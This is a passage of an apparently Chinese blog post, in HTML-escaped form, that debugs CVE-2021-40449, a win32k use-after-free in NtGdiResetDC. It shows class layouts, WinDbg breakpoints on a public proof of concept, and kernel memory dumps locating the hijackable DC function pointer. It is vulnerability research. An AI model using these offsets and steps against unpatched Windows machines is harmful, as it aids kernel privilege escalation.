&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DC&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> OBJECT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DHPDEV dhpdev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PDEV &lt;span style="color:#f92672">*&lt;/span>ppdev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HDC hdcNext_; &lt;span style="color:#75715e">// HDC链表指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HDC hdcPrev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCLEVEL dclevel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> DC &lt;span style="color:#f92672">*&lt;/span>PDC;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">XDCOBJ&lt;/span> &lt;span style="color:#75715e">/* dco */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PDC pdc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> XDCOBJ &lt;span style="color:#f92672">*&lt;/span>PXDCOBJ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DCOBJ&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> XDCOBJ &lt;span style="color:#75715e">/* mdo */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ() { pdc &lt;span style="color:#f92672">=&lt;/span> (PDC) NULL; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ(HDC hdc) { vLock(hdc); }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">~&lt;/span>DCOBJ() { vUnlockNoNullSet(); }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> DCOBJ &lt;span style="color:#f92672">*&lt;/span>PDCOBJ;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>类之间的关系可以简化为下图：&lt;/p>
&lt;p>
&lt;img alt="对象关系图" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg" />&lt;/p>
&lt;h3 id="调试">调试&lt;/h3>
&lt;h4 id="free部分">free部分&lt;/h4>
&lt;p>在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。&lt;/p>
&lt;p>调试环境：虚拟机windows 10 1607、物理机windows 10 2004&lt;/p>
&lt;p>POC:
&lt;a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit&lt;/a>&lt;/p>
&lt;p>断点:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">NtGdiResetDC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">NtGdiResetDC&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xc1&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用GreResetDCInternal函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x3a&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用DCOBJ构造函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x116&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用_imp_hdcOpenDCW函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x136&lt;/span> &lt;span style="color:#e6db74">&amp;#34;第二次DCOBJ&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x1b5&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用DC对象函数指针&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x1d1&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用HmgSwapLockedHandle函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x20d&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用_imp_bDeleteDCInternal函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">cve_2021_40449&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">hook_DrvEnablePDEV&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x12a&lt;/span> &lt;span style="color:#e6db74">&amp;#34;循环调用&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kbase&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">PALMEMOBJ&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">bCreatePalette&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用win32kbase!PALMEMOBJ::bCreatePalette&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行POC，断点&lt;code>bp win32kfull!NtGdiResetDC&lt;/code>触发此时传入的句柄为&lt;code>rcx=00000000092105f1&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="NtGdiResetDC" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png" />&lt;/p>
&lt;p>第一次调用&lt;code>win32kfull!GreResetDCInternal&lt;/code> 时传入各个参数为&lt;code>rcx=00000000092105f1&lt;/code> &lt;code>rdx=0000000000000000&lt;/code> &lt;code>r8=ffffb101aadf2a44&lt;/code> 即第一个句柄值为&lt;code>00000000092105f1&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="image-20211110143416643" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110143416643.png" />&lt;/p>
&lt;p>第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，&lt;/p>
&lt;p>
&lt;img alt="image-20211110151223865" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110151223865.png" />&lt;/p>
&lt;p>根据&lt;strong>漏洞形成分析&lt;/strong>的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：&lt;code>ffffd548a1f10c30&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29c0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29d0 &lt;span style="color:#ae81ff">0000026&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">6e766&lt;/span>b20 &lt;span style="color:#ae81ff">000000&lt;/span>d7&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>aff680
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29e0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29f0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a00 ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2b80 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f18fe6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a10 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a20 ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a44 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a30 &lt;span style="color:#ae81ff">000000&lt;/span>d7&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>aff5d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// rbx存放了构造函数产生的DCO对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d020 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b45ad780 &lt;span style="color:#ae81ff">0000026&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">6e75&lt;/span>ea10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d030 &lt;span style="color:#ae81ff">00100010&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d050 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b56f1260 &lt;span style="color:#ae81ff">0000000&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>a01f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d060 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d3d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">88000&lt;/span>b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d070 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000004f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00005&lt;/span>d90
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d080 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 计算公式 *(dco地址+0x30)=dc地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d050 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b56f1260 &lt;span style="color:#ae81ff">0000000&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>a01f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d060 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d3d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">88000&lt;/span>b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d070 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000004f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00005&lt;/span>d90
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d080 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d090 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d0a0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00001&lt;/span>a10 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00004&lt;/span>cb0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d0b0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000105f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 计算公式 *(dc地址 +0xad0)=函数地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xad0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b00 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1db18c0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b10 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b20 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10930
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b30 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f11dc0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b40 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0e6b0 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f11b00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b50 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0cd70
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b60 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0d1f0 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f112f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b70 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下为函数的汇编
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> u ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>win32kfull&lt;span style="color:#f92672">!&lt;/span>UMPDDrvResetPDEV:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 &lt;span style="color:#ae81ff">48895&lt;/span>c2418 mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h],rbx
